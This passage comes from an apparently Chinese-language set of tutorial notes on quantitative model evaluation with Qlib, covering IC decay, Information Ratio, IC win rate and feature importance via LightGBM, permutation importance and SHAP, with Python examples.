最大滞后阶数\n \n    返回:\n        ic_decay_series: IC衰减序列\n    &quot;&quot;&quot;\n    ic_decay_series = []\n \n    for lag in range(max_lag + 1):\n        # 对齐数据\n        pred = y_pred[:len(y_pred) - lag]\n        true = y_true[lag:len(y_true)]\n \n        # 计算IC\n        ic = pearsonr(pred, true)[0]\n        ic_decay_series.append(ic)\n \n    return np.array(ic_decay_series)\n \n# 示例\ny_pred = np.random.randn(500)\ny_true = np.random.randn(500)\n \nic_decay_series = ic_decay(y_pred, y_true, max_lag=10)\n \nfor lag, ic in enumerate(ic_decay_series):\n    print(f&quot;Lag {lag}: IC = {ic:.4f}&quot;)\nIC衰减可视化\ndef plot_ic_decay(y_pred, y_true, max_lag=10):\n    &quot;&quot;&quot;\n    绘制IC衰减曲线\n    &quot;&quot;&quot;\n    ic_decay_series = ic_decay(y_pred, y_true, max_lag)\n \n    plt.figure(figsize=(10, 6))\n    plt.bar(range(max_lag + 1), ic_decay_series)\n    plt.xlabel(&#039;Lag&#039;)\n    plt.ylabel(&#039;IC&#039;)\n    plt.title(&#039;IC Decay Analysis&#039;)\n    plt.grid(True, axis=&#039;y&#039;)\n    plt.show()\n \n# 使用示例\nplot_ic_decay(y_pred, y_true, max_lag=10)\n5. IR（Information Ratio）\n5.1 IR的定义\n数学定义\nIR（Information Ratio，信息比率）是IC的均值除以IC的标准差：\nIR = \\frac{E[IC]}{\\sigma_{IC}}\n其中：\n\nE[IC] 是IC的期望（均值）\n\\sigma_{IC} 是IC的标准差\n\n意义\nIR衡量预测能力的稳定性：\n\nIR高：IC均值高且稳定\nIR低：IC均值低或不稳定\n\n代码实现\ndef calculate_ir(ic_series):\n    &quot;&quot;&quot;\n    计算IR\n \n    参数:\n        ic_series: IC序列\n \n    返回:\n        ir: 信息比率\n        ic_mean: IC均值\n        ic_std: IC标准差\n    &quot;&quot;&quot;\n    ic_mean = np.mean(ic_series)\n    ic_std = np.std(ic_series, ddof=1)  # 使用样本标准差\n \n    if ic_std == 0:\n        ir = 0\n    else:\n        ir = ic_mean / ic_std\n \n    return ir, ic_mean, ic_std\n \n# 示例\nic_series = np.array([0.05, 0.03, 0.07, 0.04, 0.06])\n \nir, ic_mean, ic_std = calculate_ir(ic_series)\n \nprint(f&quot;IC均值: {ic_mean:.4f}&quot;)\nprint(f&quot;IC标准差: {ic_std:.4f}&quot;)\nprint(f&quot;IR: {ir:.4f}&quot;)\n5.2 IR与IC的关系\n关系分析\nIR = \\frac{E[IC]}{\\sigma_{IC}}\n\nIC高，IR高：预测能力强且稳定\nIC高，IR低：预测能力强但不稳定\nIC低，IR高：预测能力弱但稳定\nIC低，IR低：预测能力弱且不稳定\n\n示例对比\n# 场景1：IC高且稳定\nic_series_1 = np.array([0.05, 0.05, 0.05, 0.05, 0.05])\nir_1, mean_1, std_1 = calculate_ir(ic_series_1)\nprint(f&quot;场景1 - IC={mean_1:.4f}, IR={ir_1:.4f} (高且稳定)&quot;)\n \n# 场景2：IC高但不稳定\nic_series_2 = np.array([0.10, 0.00, 0.10, 0.00, 0.10])\nir_2, mean_2, std_2 = calculate_ir(ic_series_2)\nprint(f&quot;场景2 - IC={mean_2:.4f}, IR={ir_2:.4f} (高但不稳定)&quot;)\n \n# 场景3：IC低但稳定\nic_series_3 = np.array([0.02, 0.02, 0.02, 0.02, 0.02])\nir_3, mean_3, std_3 = calculate_ir(ic_series_3)\nprint(f&quot;场景3 - IC={mean_3:.4f}, IR={ir_3:.4f} (低但稳定)&quot;)\n5.3 年化IR\n年化IR的计算\n如果IC按日计算，年化IR为：\nIR_{annual} = IR_{daily} \\times \\sqrt{252}\n其中252是每年的交易日数量。\n代码实现\ndef annualized_ir(ic_series, periods_per_year=252):\n    &quot;&quot;&quot;\n    年化IR\n \n    参数:\n        ic_series: IC序列\n        periods_per_year: 每年周期数\n \n    返回:\n        ir_annual: 年化IR\n    &quot;&quot;&quot;\n    ir, ic_mean, ic_std = calculate_ir(ic_series)\n    ir_annual = ir * np.sqrt(periods_per_year)\n \n    return ir_annual\n \n# 示例：每日IC\ndaily_ic_series = np.random.randn(252) * 0.01 + 0.03\n \nir_annual = annualized_ir(daily_ic_series)\nprint(f&quot;年化IR: {ir_annual:.4f}&quot;)\n6. IC在不同子集上的表现\n6.1 按市场状态分析IC\n市场状态分类\ndef analyze_ic_by_market_regime(y_pred, y_true, regimes):\n    &quot;&quot;&quot;\n    按市场状态分析IC\n \n    参数:\n        y_pred: 预测值\n        y_true: 实际值\n        regimes: 市场状态（-1=熊市, 0=震荡, 1=牛市）\n \n    返回:\n        dict: {regime: {&#039;ic&#039;: ic, &#039;n_samples&#039;: n_samples}}\n    &quot;&quot;&quot;\n    results = {}\n \n    for regime in [-1, 0, 1]:\n        mask = regimes == regime\n        y_pred_regime = y_pred[mask]\n        y_true_regime = y_true[mask]\n \n        if len(y_pred_regime) &gt; 0:\n            ic = pearsonr(y_pred_regime, y_true_regime)[0]\n            results[regime] = {\n                &#039;ic&#039;: ic,\n                &#039;n_samples&#039;: len(y_pred_regime)\n            }\n \n    return results\n \n# 示例\nregimes = np.random.choice([-1, 0, 1], size=len(y_pred), p=[0.2, 0.6, 0.2])\n \nresults = analyze_ic_by_market_regime(y_pred, y_true, regimes)\n \nfor regime in [-1, 0, 1]:\n    regime_name = {-1: &#039;熊市&#039;, 0: &#039;震荡市&#039;, 1: &#039;牛市&#039;}[regime]\n    if regime in results:\n        print(f&quot;{regime_name}: IC={results[regime][&#039;ic&#039;]:.4f}, 样本数={results[regime][&#039;n_samples&#039;]}&quot;)\n6.2 按行业分析IC\ndef analyze_ic_by_industry(y_pred, y_true, industry_codes):\n    &quot;&quot;&quot;\n    按行业分析IC\n \n    参数:\n        y_pred: 预测值\n        y_true: 实际值\n        industry_codes: 行业代码\n \n    返回:\n        dict: {industry: {&#039;ic&#039;: ic, &#039;n_samples&#039;: n_samples}}\n    &quot;&quot;&quot;\n    results = {}\n \n    for code in np.unique(industry_codes):\n        mask = industry_codes == code\n        y_pred_industry = y_pred[mask]\n        y_true_industry = y_true[mask]\n \n        if len(y_pred_industry) &gt; 0:\n            ic = pearsonr(y_pred_industry, y_true_industry)[0]\n            results[code] = {\n                &#039;ic&#039;: ic,\n                &#039;n_samples&#039;: len(y_pred_industry)\n            }\n \n    return results\n \n# 示例\nindustry_codes = np.random.choice([1, 2, 3, 4, 5], size=len(y_pred))\n \nresults = analyze_ic_by_industry(y_pred, y_true, industry_codes)\n \nfor code, result in results.items():\n    print(f&quot;行业{code}: IC={result[&#039;ic&#039;]:.4f}, 样本数={result[&#039;n_samples&#039;]}&quot;)\n7. IC 胜率\n7.1 IC 胜率的定义\n定义：\nIC 胜率 = IC &gt; 0 的天数比例\n标准：\n\n胜率 &gt; 50%: 预测整体有效\n胜率 &gt; 55%: 较为理想\n胜率 &gt; 60%: 非常好\n\n注意：\n即使平均 IC 很高，如果胜率低，说明模型可能只在少数天有效，风险较大。\n实现代码：\ndef calculate_ic_win_rate(ic_series):\n    &quot;&quot;&quot;\n    计算 IC 胜率\n \n    参数:\n        ic_series: IC 序列\n \n    返回:\n        win_rate: 胜率 (0~1)\n    &quot;&quot;&quot;\n    return (ic_series &gt; 0).mean()\n \n# 使用示例\nwin_rate = calculate_ic_win_rate(ic_series)\nprint(f&quot;IC 胜率: {win_rate * 100:.1f}%&quot;)\n7.2 IC 胜率与均值的关系\n场景分析：\n# 场景1: 高均值，低胜率（不稳定）\nic_scenario1 = np.array([0.15, 0.12, -0.05, 0.18, -0.08, 0.20])\nwin_rate1 = (ic_scenario1 &gt; 0).mean()\nmean_ic1 = ic_scenario1.mean()\nprint(f&quot;场景1 - IC均值={mean_ic1:.4f}, 胜率={win_rate1*100:.1f}% (高均值低胜率)&quot;)\n \n# 场景2: 中等均值，高胜率（稳定）\nic_scenario2 = np.array([0.04, 0.05, 0.03, 0.06, 0.04, 0.05])\nwin_rate2 = (ic_scenario2 &gt; 0).mean()\nmean_ic2 = ic_scenario2.mean()\nprint(f&quot;场景2 - IC均值={mean_ic2:.4f}, 胜率={win_rate2*100:.1f}% (中等均值高胜率)&quot;)\n \n# 场景3: 低均值，高胜率（稳定但信号弱）\nic_scenario3 = np.array([0.02, 0.01, 0.02, 0.01, 0.02, 0.01])\nwin_rate3 = (ic_scenario3 &gt; 0).mean()\nmean_ic3 = ic_scenario3.mean()\nprint(f&quot;场景3 - IC均值={mean_ic3:.4f}, 胜率={win_rate3*100:.1f}% (低均值高胜率)&quot;)\n建议：\n\n优先选择高胜率模型（稳定性好）\n在高胜率基础上，追求更高IC均值\n避免低胜率但高均值的模型（风险大）\n\n8. 完整评估函数\n8.1 评估报告生成\ndef calculate_daily_ic(pred, true):\n    &quot;&quot;&quot;\n    计算每日 IC\n \n    参数:\n        pred: 预测值 (Series 或 DataFrame)\n        true: 真实值 (Series 或 DataFrame)\n \n    返回:\n        ic: IC 值\n        pvalue: 显著性 p 值\n    &quot;&quot;&quot;\n    ic, pvalue = pearsonr(pred, true)\n    return ic, pvalue\n \ndef calculate_ic_series(pred_df, true_df):\n    &quot;&quot;&quot;\n    计算时间序列 IC\n \n    参数:\n        pred_df: 预测值 DataFrame (index: [date, instrument])\n        true_df: 真实值 DataFrame (同上)\n \n    返回:\n        ic_series: IC 序列\n    &quot;&quot;&quot;\n    # 按日期分组\n    dates = pred_df.index.get_level_values(0).unique()\n \n    ic_values = []\n    for date in dates:\n        pred = pred_df.loc[date]\n        true = true_df.loc[date]\n \n        ic, _ = calculate_daily_ic(pred.values, true.values)\n        ic_values.append(ic)\n \n    return pd.Series(ic_values, index=dates)\n \ndef evaluate_model(pred_df, true_df):\n    &quot;&quot;&quot;\n    完整的模型评估函数\n \n    参数:\n        pred_df: 预测值 DataFrame (index: [date, instrument])\n        true_df: 真实值 DataFrame (同上)\n \n    返回:\n        evaluation_report: 评估报告\n    &quot;&quot;&quot;\n    # 计算 IC 系列和 Rank IC 系列\n    ic_series = calculate_ic_series(pred_df, true_df)\n    rank_ic_series = calculate_rank_ic_series(pred_df, true_df)\n \n    # 计算指标\n    metrics = {\n        &#039;IC_mean&#039;: ic_series.mean(),\n        &#039;IC_std&#039;: ic_series.std(),\n        &#039;ICIR&#039;: ic_series.mean() / ic_series.std() if ic_series.std() &gt; 0 else 0,\n        &#039;IC_positive_ratio&#039;: (ic_series &gt; 0).mean(),\n        &#039;Rank_IC_mean&#039;: rank_ic_series.mean(),\n        &#039;Rank_IC_std&#039;: rank_ic_series.std(),\n        &#039;n_days&#039;: len(ic_series),\n    }\n \n    # 打印报告\n    print(&quot;=&quot; * 60)\n    print(&quot;📊 模型评估报告&quot;)\n    print(&quot;=&quot; * 60)\n \n    print(&quot;\\nIC 指标:&quot;)\n    print(f&quot;  IC 均值: {metrics[&#039;IC_mean&#039;]:.4f}&quot;)\n    print(f&quot;  IC 标准差: {metrics[&#039;IC_std&#039;]:.4f}&quot;)\n    print(f&quot;  ICIR: {metrics[&#039;ICIR&#039;]:.4f}&quot;)\n    print(f&quot;  IC 胜率: {metrics[&#039;IC_positive_ratio&#039;] * 100:.2f}%&quot;)\n \n    print(&quot;\\nRank IC 指标:&quot;)\n    print(f&quot;  Rank IC 均值: {metrics[&#039;Rank_IC_mean&#039;]:.4f}&quot;)\n    print(f&quot;  Rank IC 标准差: {metrics[&#039;Rank_IC_std&#039;]:.4f}&quot;)\n \n    print(&quot;\\n模型质量评估:&quot;)\n    if metrics[&#039;IC_mean&#039;] &gt; 0.05:\n        print(&quot;  ✅ IC 均值优秀&quot;)\n    elif metrics[&#039;IC_mean&#039;] &gt; 0.03:\n        print(&quot;  ✅ IC 均值有效&quot;)\n    else:\n        print(&quot;  ⚠️ IC 均值较弱&quot;)\n \n    if metrics[&#039;ICIR&#039;] &gt; 0.5:\n        print(&quot;  🌟 ICIR 非常稳定&quot;)\n    elif metrics[&#039;ICIR&#039;] &gt; 0.3:\n        print(&quot;  ✅ ICIR 较稳定&quot;)\n    else:\n        print(&quot;  ⚠️ ICIR 稳定性一般&quot;)\n \n    if metrics[&#039;IC_positive_ratio&#039;] &gt; 0.55:\n        print(&quot;  ✅ IC 胜率良好&quot;)\n    else:\n        print(&quot;  ⚠️ IC 胜率一般&quot;)\n \n    print(&quot;=&quot; * 60)\n \n    return metrics\n \ndef calculate_rank_ic_series(pred_df, true_df):\n    &quot;&quot;&quot;\n    计算时间序列 Rank IC\n \n    参数:\n        pred_df: 预测值 DataFrame\n        true_df: 真实值 DataFrame\n \n    返回:\n        rank_ic_series: Rank IC 序列\n    &quot;&quot;&quot;\n    dates = pred_df.index.get_level_values(0).unique()\n    \n    rank_ic_values = []\n    for date in dates:\n        pred = pred_df.loc[date]\n        true = true_df.loc[date]\n        \n        rank_ic, _ = spearmanr(pred.values, true.values)\n        rank_ic_values.append(rank_ic)\n    \n    return pd.Series(rank_ic_values, index=dates)\n \n# 使用示例\nimport pandas as pd\n \n# 创建示例数据\nn_days = 100\nn_stocks = 300\n \ndates = pd.date_range(&#039;2020-01-01&#039;, periods=n_days, freq=&#039;D&#039;)\nstocks = [f&#039;stock_{i}&#039; for i in range(n_stocks)]\nindex = pd.MultiIndex.from_product([dates, stocks], names=[&#039;date&#039;, &#039;instrument&#039;])\n \npred_df = pd.DataFrame(np.random.randn(len(index)), index=index, columns=[&#039;pred&#039;])\ntrue_df = pd.DataFrame(np.random.randn(len(index)), index=index, columns=[&#039;true&#039;])\n \n# 评估模型\nmetrics = evaluate_model(pred_df, true_df)\n8.2 模型质量判断标准\nIC 均值标准：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nIC 值模型质量&gt; 0.10🌟 顶级 (非常罕见)&gt; 0.05✅ 优秀&gt; 0.03✅ 有效0.02~0.03⚠️ 一般&lt; 0.02❌ 较弱\nICIR 标准：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nICIR 值稳定性&gt; 0.5🌟 非常稳定&gt; 0.3✅ 较稳定&gt; 0.2⚠️ 一般&lt; 0.2❌ 不稳定\nIC 胜率标准：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n胜率评价&gt; 60%🌟 优秀&gt; 55%✅ 良好&gt; 50%⚠️ 一般&lt; 50%❌ 较差\n8.3 可视化评估结果\nimport matplotlib.pyplot as plt\n \ndef plot_ic_evaluation(ic_series, rank_ic_series):\n    &quot;&quot;&quot;\n    绘制IC评估结果\n    \n    参数:\n        ic_series: IC 序列\n        rank_ic_series: Rank IC 序列\n    &quot;&quot;&quot;\n    fig, axes = plt.subplots(2, 2, figsize=(15, 10))\n    \n    # IC 时间序列\n    axes[0, 0].plot(ic_series, linewidth=1, alpha=0.7)\n    axes[0, 0].axhline(y=0, color=&#039;r&#039;, linestyle=&#039;--&#039;, alpha=0.5)\n    axes[0, 0].axhline(y=ic_series.mean(), color=&#039;g&#039;, linestyle=&#039;--&#039;, \n                       label=f&#039;Mean: {ic_series.mean():.4f}&#039;)\n    axes[0, 0].set_xlabel(&#039;Date&#039;)\n    axes[0, 0].set_ylabel(&#039;IC&#039;)\n    axes[0, 0].set_title(&#039;IC Time Series&#039;)\n    axes[0, 0].legend()\n    axes[0, 0].grid(True, alpha=0.3)\n    \n    # IC 分布\n    axes[0, 1].hist(ic_series, bins=30, alpha=0.7, edgecolor=&#039;black&#039;)\n    axes[0, 1].axvline(x=ic_series.mean(), color=&#039;r&#039;, linestyle=&#039;--&#039;,\n                       label=f&#039;Mean: {ic_series.mean():.4f}&#039;)\n    axes[0, 1].axvline(x=0, color=&#039;gray&#039;, linestyle=&#039;-&#039;, alpha=0.5)\n    axes[0, 1].set_xlabel(&#039;IC&#039;)\n    axes[0, 1].set_ylabel(&#039;Frequency&#039;)\n    axes[0, 1].set_title(&#039;IC Distribution&#039;)\n    axes[0, 1].legend()\n    axes[0, 1].grid(True, alpha=0.3)\n    \n    # Rank IC 时间序列\n    axes[1, 0].plot(rank_ic_series, linewidth=1, alpha=0.7, color=&#039;orange&#039;)\n    axes[1, 0].axhline(y=0, color=&#039;r&#039;, linestyle=&#039;--&#039;, alpha=0.5)\n    axes[1, 0].axhline(y=rank_ic_series.mean(), color=&#039;g&#039;, linestyle=&#039;--&#039;,\n                       label=f&#039;Mean: {rank_ic_series.mean():.4f}&#039;)\n    axes[1, 0].set_xlabel(&#039;Date&#039;)\n    axes[1, 0].set_ylabel(&#039;Rank IC&#039;)\n    axes[1, 0].set_title(&#039;Rank IC Time Series&#039;)\n    axes[1, 0].legend()\n    axes[1, 0].grid(True, alpha=0.3)\n    \n    # IC vs Rank IC 散点图\n    axes[1, 1].scatter(ic_series, rank_ic_series, alpha=0.6, s=20)\n    axes[1, 1].axhline(y=0, color=&#039;r&#039;, linestyle=&#039;--&#039;, alpha=0.3)\n    axes[1, 1].axvline(x=0, color=&#039;r&#039;, linestyle=&#039;--&#039;, alpha=0.3)\n    axes[1, 1].plot([min(ic_series), max(ic_series)], \n                     [min(ic_series), max(ic_series)], \n                     &#039;r--&#039;, alpha=0.5, label=&#039;y=x&#039;)\n    axes[1, 1].set_xlabel(&#039;IC&#039;)\n    axes[1, 1].set_ylabel(&#039;Rank IC&#039;)\n    axes[1, 1].set_title(&#039;IC vs Rank IC&#039;)\n    axes[1, 1].legend()\n    axes[1, 1].grid(True, alpha=0.3)\n    \n    plt.tight_layout()\n    plt.show()\n \n# 使用示例\nplot_ic_evaluation(ic_series, rank_ic_series)\n9. IC在模型评估中的应用\n9.1 交叉验证中的IC评估\nfrom sklearn.model_selection import TimeSeriesSplit\n \ndef cross_validate_ic(X, y, params, model, n_splits=5):\n    &quot;&quot;&quot;\n    时间序列交叉验证，评估IC\n \n    参数:\n        X: 特征矩阵\n        y: 目标变量\n        params: 模型参数\n        model: 模型对象\n        n_splits: 折数\n \n    返回:\n        ic_scores: 每折的IC得分\n        models: 训练的模型列表\n    &quot;&quot;&quot;\n    tscv = TimeSeriesSplit(n_splits=n_splits)\n    ic_scores = []\n    models = []\n \n    for fold, (train_idx, val_idx) in enumerate(tscv.split(X)):\n        print(f&quot;Fold {fold + 1}/{n_splits}&quot;)\n \n        X_train, X_val = X[train_idx], X[val_idx]\n        y_train, y_val = y[train_idx], y[val_idx]\n \n        # 训练模型\n        model.fit(X_train, y_train)\n \n        # 预测\n        y_pred = model.predict(X_val)\n \n        # 计算IC\n        ic = pearsonr(y_pred, y_val)[0]\n        ic_scores.append(ic)\n        models.append(model)\n \n        print(f&quot;  Val IC: {ic:.4f}&quot;)\n \n    return ic_scores, models\n \n# 示例\nfrom lightgbm import LGBMRegressor\n \nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n}\n \nmodel = LGBMRegressor(**params)\nic_scores, models = cross_validate_ic(X, y, params, model, n_splits=5)\n \nprint(f&quot;\\n平均IC: {np.mean(ic_scores):.4f}&quot;)\nprint(f&quot;IC标准差: {np.std(ic_scores):.4f}&quot;)\n7.2 IC与模型选择\ndef select_model_by_ic(X_train, y_train, X_val, y_val, param_grid, model_class):\n    &quot;&quot;&quot;\n    基于IC选择最佳模型\n \n    参数:\n        X_train, y_train: 训练数据\n        X_val, y_val: 验证数据\n        param_grid: 参数网格\n        model_class: 模型类\n \n    返回:\n        best_model: 最佳模型\n        best_params: 最佳参数\n        best_ic: 最佳IC\n    &quot;&quot;&quot;\n    best_model = None\n    best_params = None\n    best_ic = -np.inf\n \n    from itertools import product\n \n    keys = param_grid.keys()\n    values = param_grid.values()\n \n    for combination in product(*values):\n        params = dict(zip(keys, combination))\n \n        # 训练模型\n        model = model_class(**params)\n        model.fit(X_train, y_train)\n \n        # 预测\n        y_pred = model.predict(X_val)\n \n        # 计算IC\n        ic = pearsonr(y_pred, y_val)[0]\n \n        if ic &gt; best_ic:\n            best_ic = ic\n            best_model = model\n            best_params = params\n \n        print(f&quot;Params: {params}, IC: {ic:.4f}&quot;)\n \n    return best_model, best_params, best_ic\n \n# 示例\nparam_grid = {\n    &#039;num_leaves&#039;: [31, 63],\n    &#039;learning_rate&#039;: [0.01, 0.05, 0.1],\n    &#039;min_data_in_leaf&#039;: [10, 20],\n}\n \nbest_model, best_params, best_ic = select_model_by_ic(\n    X_train, y_train, X_val, y_val, param_grid, LGBMRegressor\n)\n \nprint(f&quot;\\n最佳参数: {best_params}&quot;)\nprint(f&quot;最佳IC: {best_ic:.4f}&quot;)\n8. 总结\nIC和Rank IC是量化投资中最重要的评估指标：\n\nIC定义：预测值与实际值的Pearson相关系数\nRank IC：预测值排序与实际值排序的Spearman秩相关系数\n统计显著性：通过t检验和置信区间验证IC的显著性\n时序分析：滚动IC和IC衰减分析预测的稳定性和时效性\nIR指标：衡量IC的稳定性，IC均值除以标准差\n多维度分析：按市场状态、行业等子集分析IC表现\n\nIC是量化模型评估的核心，正确的IC分析是构建有效量化策略的基础。"},"quant/qlib/week2/05-特征重要性分析":{"slug":"quant/qlib/week2/05-特征重要性分析","filePath":"quant/qlib/week2/05-特征重要性分析.md","title":"05-特征重要性分析","links":[],"tags":[],"content":"特征重要性分析\n1. 特征重要性基础\n1.1 特征重要性的意义\n为什么重要？\n在量化投资中，特征重要性分析有三大价值：\n\n模型解释性：理解模型如何做决策\n特征筛选：识别有效因子，剔除冗余因子\n风险控制：避免模型依赖无效特征\n\n量化场景的特殊性\n量化数据的特点：\n\n高维特征：数百到数千个因子\n低信噪比：大量噪声特征\n强相关性：因子间存在多重共线性\n非平稳性：因子重要性随时间变化\n\n1.2 LightGBM的特征重要性类型\nLightGBM提供两种特征重要性：\n\n\nSplit重要性（分裂重要性）\n\n基于特征作为分裂节点的次数\n衡量特征在分裂决策中的使用频率\n\n\n\nGain重要性（增益重要性）\n\n基于分裂带来的信息增益\n衡量特征对模型性能的贡献度\n\n\n\n代码示例\nimport lightgbm as lgb\nimport matplotlib.pyplot as plt\n \n# 训练模型\nmodel = lgb.train(params, train_data, num_boost_round=1000,\n                  valid_sets=[train_data, val_data],\n                  callbacks=[lgb.early_stopping(stopping_rounds=50)])\n \n# 获取特征重要性\nsplit_importance = model.feature_importance(importance_type=&#039;split&#039;)\ngain_importance = model.feature_importance(importance_type=&#039;gain&#039;)\n \n# 打印\nprint(&quot;Split重要性（前10）：&quot;)\nfor i, (idx, imp) in enumerate(sorted(enumerate(split_importance),\n                                      key=lambda x: x[1], reverse=True)[:10]):\n    print(f&quot;  {idx+1}. 特征{idx}: {imp}&quot;)\n \nprint(&quot;\\nGain重要性（前10）：&quot;)\nfor i, (idx, imp) in enumerate(sorted(enumerate(gain_importance),\n                                      key=lambda x: x[1], reverse=True)[:10]):\n    print(f&quot;  {idx+1}. 特征{idx}: {imp:.2f}&quot;)\n2. 特征重要性可视化\n2.1 条形图可视化\ndef plot_feature_importance(model, feature_names, importance_type=&#039;gain&#039;, top_n=20):\n    &quot;&quot;&quot;\n    绘制特征重要性条形图\n \n    参数:\n        model: LightGBM模型\n        feature_names: 特征名称列表\n        importance_type: &#039;split&#039; 或 &#039;gain&#039;\n        top_n: 显示前n个特征\n    &quot;&quot;&quot;\n    # 获取重要性\n    importance = model.feature_importance(importance_type=importance_type)\n \n    # 排序\n    indices = np.argsort(importance)[::-1][:top_n]\n    importance = importance[indices]\n    feature_names = np.array(feature_names)[indices]\n \n    # 绘制\n    plt.figure(figsize=(12, 8))\n    plt.barh(range(len(importance)), importance[::-1])\n    plt.yticks(range(len(importance)), feature_names[::-1])\n    plt.xlabel(f&#039;Feature Importance ({importance_type})&#039;)\n    plt.title(f&#039;Top {top_n} Feature Importance&#039;)\n    plt.tight_layout()\n    plt.show()\n \n# 使用示例\nfeature_names = [f&#039;factor_{i}&#039; for i in range(X.shape[1])]\nplot_feature_importance(model, feature_names, importance_type=&#039;gain&#039;, top_n=20)\n2.2 对数重要性图\ndef plot_feature_importance_log(model, feature_names, importance_type=&#039;gain&#039;):\n    &quot;&quot;&quot;\n    绘制对数特征重要性图\n \n    适用于特征重要性差异巨大的情况\n    &quot;&quot;&quot;\n    importance = model.feature_importance(importance_type=importance_type)\n    importance = np.maximum(importance, 1e-6)  # 避免log(0)\n \n    indices = np.argsort(importance)[::-1]\n    importance_log = np.log(importance[indices])\n \n    plt.figure(figsize=(12, 8))\n    plt.plot(range(len(importance_log)), importance_log, marker=&#039;o&#039;)\n    plt.xlabel(&#039;Feature Rank&#039;)\n    plt.ylabel(&#039;Log Feature Importance&#039;)\n    plt.title(f&#039;Feature Importance Distribution (Log Scale) - {importance_type}&#039;)\n    plt.grid(True)\n    plt.show()\n \nplot_feature_importance_log(model, feature_names, importance_type=&#039;gain&#039;)\n3. 基于Permutation的特征重要性\n3.1 Permutation Importance原理\n核心思想\nPermutation Importance通过打乱特征的值来评估其重要性：\n\n计算基准模型性能\n打乱某个特征的值\n重新计算模型性能\n性能下降越大，特征越重要\n\n优势\n\n不依赖于模型类型\n考虑特征间的交互作用\n更真实反映特征重要性\n\n代码实现\nfrom sklearn.metrics import mean_squared_error\nfrom scipy.stats import pearsonr\n \ndef permutation_importance(model, X, y, metric=&#039;ic&#039;, n_repeats=5, random_state=42):\n    &quot;&quot;&quot;\n    计算Permutation Importance\n \n    参数:\n        model: 训练好的模型\n        X: 特征矩阵\n        y: 目标变量\n        metric: 评估指标 (&#039;rmse&#039;, &#039;r2&#039;, &#039;ic&#039;, &#039;rank_ic&#039;)\n        n_repeats: 重复次数\n        random_state: 随机种子\n \n    返回:\n        importances: 特征重要性数组，shape=[n_features, n_repeats]\n    &quot;&quot;&quot;\n    np.random.seed(random_state)\n    n_features = X.shape[1]\n    importances = np.zeros((n_features, n_repeats))\n \n    # 计算基准性能\n    y_pred = model.predict(X)\n    if metric == &#039;rmse&#039;:\n        baseline_score = np.sqrt(mean_squared_error(y, y_pred))\n    elif metric == &#039;r2&#039;:\n        from sklearn.metrics import r2_score\n        baseline_score = r2_score(y, y_pred)\n    elif metric == &#039;ic&#039;:\n        baseline_score = pearsonr(y_pred, y)[0]\n    elif metric == &#039;rank_ic&#039;:\n        from scipy.stats import spearmanr\n        baseline_score = spearmanr(y_pred, y)[0]\n    else:\n        raise ValueError(f&quot;Unknown metric: {metric}&quot;)\n \n    print(f&quot;Baseline {metric}: {baseline_score:.4f}&quot;)\n \n    # 对每个特征进行Permutation\n    for feature_idx in range(n_features):\n        print(f&quot;Processing feature {feature_idx + 1}/{n_features}&quot;)\n \n        for repeat in range(n_repeats):\n            # 打乱特征\n            X_permuted = X.copy()\n            np.random.shuffle(X_permuted[:, feature_idx])\n \n            # 重新预测\n            y_pred_permuted = model.predict(X_permuted)\n \n            # 计算性能\n            if metric == &#039;rmse&#039;:\n                score = np.sqrt(mean_squared_error(y, y_pred_permuted))\n                importance = score - baseline_score  # RMSE增加，重要\n            elif metric == &#039;r2&#039;:\n                score = r2_score(y, y_pred_permuted)\n                importance = baseline_score - score  # R2减少，重要\n            elif metric == &#039;ic&#039;:\n                score = pearsonr(y_pred_permuted, y)[0]\n                importance = baseline_score - score  # IC减少，重要\n            elif metric == &#039;rank_ic&#039;:\n                score = spearmanr(y_pred_permuted, y)[0]\n                importance = baseline_score - score  # Rank IC减少，重要\n \n            importances[feature_idx, repeat] = importance\n \n    return importances\n \n# 使用示例\nimportances = permutation_importance(model, X_val, y_val, metric=&#039;ic&#039;, n_repeats=5)\n \n# 计算平均重要性\nmean_importance = importances.mean(axis=1)\nstd_importance = importances.std(axis=1)\n \n# 排序\nsorted_indices = np.argsort(mean_importance)[::-1]\n \nprint(&quot;\\nPermutation Importance (IC):&quot;)\nfor i, idx in enumerate(sorted_indices[:10]):\n    print(f&quot;  {i+1}. 特征{idx}: {mean_importance[idx]:.4f} ± {std_importance[idx]:.4f}&quot;)\n3.2 可视化Permutation Importance\ndef plot_permutation_importance(importances, feature_names, top_n=20):\n    &quot;&quot;&quot;\n    绘制Permutation Importance\n \n    参数:\n        importances: 特征重要性数组，shape=[n_features, n_repeats]\n        feature_names: 特征名称\n        top_n: 显示前n个特征\n    &quot;&quot;&quot;\n    # 计算平均重要性\n    mean_imp = importances.mean(axis=1)\n    std_imp = importances.std(axis=1)\n \n    # 排序\n    indices = np.argsort(mean_imp)[::-1][:top_n]\n    mean_imp = mean_imp[indices]\n    std_imp = std_imp[indices]\n    feature_names = np.array(feature_names)[indices]\n \n    # 绘制\n    plt.figure(figsize=(12, 8))\n    plt.barh(range(len(mean_imp)), mean_imp[::-1], xerr=std_imp[::-1],\n             color=&#039;steelblue&#039;, alpha=0.7, capsize=3)\n    plt.yticks(range(len(mean_imp)), feature_names[::-1])\n    plt.xlabel(&#039;Permutation Importance&#039;)\n    plt.title(f&#039;Top {top_n} Permutation Feature Importance&#039;)\n    plt.tight_layout()\n    plt.show()\n \nplot_permutation_importance(importances, feature_names, top_n=20)\n4. SHAP值分析\n4.1 SHAP原理\nSHAP（SHapley Additive exPlanations）\nSHAP值基于博弈论中的Shapley值，提供一致的局部解释。\n核心思想\n每个特征对预测的贡献：\n\\hat{y}_i = \\text{Base Value} + \\sum_{j=1}^M \\text{SHAP}_{i,j}\n其中：\n\n\\hat{y}_i 是第i个样本的预测值\nBase Value是所有样本的均值预测\n\\text{SHAP}_{i,j} 是第j个特征对第i个样本的贡献\n\n代码实现\nimport shap\n \n# 计算SHAP值\nexplainer = shap.TreeExplainer(model)\nshap_values = explainer.shap_values(X)\n \n# SHAP Summary Plot\nshap.summary_plot(shap_values, X, feature_names=feature_names, plot_type=&#039;bar&#039;)\n \n# SHAP Summary Plot (详细)\nshap.summary_plot(shap_values, X, feature_names=feature_names)\n4.2 特征重要性排序\ndef 